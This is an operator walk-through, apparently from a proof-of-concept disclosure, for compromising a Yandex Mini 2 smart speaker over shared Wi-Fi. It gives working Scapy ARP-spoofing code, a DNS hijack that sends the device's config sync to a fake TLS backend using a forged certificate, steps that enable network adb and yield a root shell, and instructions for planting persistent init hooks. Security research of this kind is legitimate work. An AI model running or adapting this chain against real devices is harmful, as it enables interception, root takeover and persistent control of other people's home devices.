# Operator walk-through (macOS)

The full setup used for the reproduction. Everything runs on one laptop on
the same Wi-Fi as the station. Timestamps and IPs are from the live session.

## 0. Prerequisites

- python3 + `pip install scapy` (raw sockets need root)
- Android platform tools (`adb`)
- a forged TLS server cert for `quasar.yandex.net` signed with the
  publicly-recoverable eMudhra intermediate key
  (see `Fluepke/emudrahahahahaha` — ECDSA P-384, private scalar = 1)
- station's stock firmware; factory state

## 1. ARP spoofing (get the station's traffic to you)

The station sends everything to the gateway MAC. Answer its ARP requests
unsolicited and continuously (a bare `arpspoof` pair also works):

```python
from scapy.all import Ether, ARP, sendp
while True:
    # to station: "the gateway (.254) is at my MAC"
    sendp(Ether(dst='3c:0b:4f:ab:16:0e')/ARP(op=2, pdst='192.168.1.82', psrc='192.168.1.254', hwsrc='32:0b:ca:bf:47:06'), iface='en0', verbose=0)
    # to router: "the station (.82) is at my MAC"
    sendp(Ether(dst='e0:60:66:68:16:ba')/ARP(op=2, pdst='192.168.1.254', psrc='192.168.1.82', hwsrc='32:0b:ca:bf:47:06'), iface='en0', verbose=0)
    time.sleep(1)
```

⚠️ **Gotcha:** your own Mac will also hear these unsolicited replies and
resolve `192.168.1.82` to *itself*, silently blackholing your own connection
attempts to the station. Fix with a static entry before connecting:

```sh
sudo arp -s 192.168.1.82 3c:0b:4f:ab:16:0e
```

## 2. DNS hijack (steer the sync to you)

The station resolves `quasar.yandex.net` via plaintext UDP/53 (its own
resolvers, and its queries cross our MITM). Answer the ones asking for the
config domain with your own IP — see `poc/dns-spoof.py`. This is far more
reliable than trying to `rdr`-redirect every possible backend IP: the
station's config endpoint round-robins over ≥6 frontends
(`213.180.204.80`, `213.180.193.{45,76,226,230}`, `93.158.134.32`, …), and
redirection is only guaranteed for connections you initiate before the
station re-resolves.

Alternative interception: `pf` `rdr` per-frontend IP. Works, but on macOS
the hairpin (redirected packet addressed to your own en0 address) is what
makes it fragile — if a redirected `SYN` sits in `CLOSED:SYN_SENT`, the
device never sees your backend's reply.

## 3. Fake backend

`poc/fake-quasar.py` — TLS server that:

- serves the poisoned `get_sync_info` payload (both path forms:
  `/get_sync_info` and the proxy-style `/quasar.yandex.net/get_sync_info` —
  match **both**, the station uses different forms depending on the
  connection path),
- answers `/check_updates` with `{"hasUpdate": false}` so the device keeps
  polling happily,
- 500s `/push_subscribe` like the real backend.

Needs the forged cert (`quasar-chain.pem` + `quasar-leaf.key`); listens on
`0.0.0.0:443` (or any port your DNS answers point at).

## 4. Power cycle, catch the boot sync

The station fetches its config at boot. With DNS hijacked, the boot sync
lands on your backend, the poisoned config enables `adbd` on the network,
and `/data/quasar/activate_network_adb` appears on the device.

## 5. Grab the shell

```sh
./poc/grab-shell.sh    # polls :5555, adb connects, runs whoami/id/uname
```

Result on a stock Mini 2:

```
uid=0(root) gid=0(root)
Linux yandex-mini2-9J9G 4.9.68 #1 SMP PREEMPT ... aarch64
```

## 6. Optional: persistence

While in the root shell:

```sh
mount -o remount,rw /
# ... drop your startup hooks into /etc/init.d/S99* ...
mount -o remount,ro /
```

The Mini 2 runs BusyBox-style SysV init; `/bkupgrade` is a writable ubifs
partition that survives reboots — a good home for binaries. The device runs
glibc 2.30 (armhf) on an aarch64 kernel and ships both loaders, so Debian
armhf binaries (e.g. dropbear) run as-is.

## 7. Cleanup / re-arming

- To undo ARP poisoning, send corrective ARPs (gateway→real router MAC,
  router→real station MAC).
- `adb connect` closes itself once the station re-syncs with the real
  backend and the config reverts.
- The whole rig is re-runnable in minutes; the attack needs no exploit
  persistence to repeat.
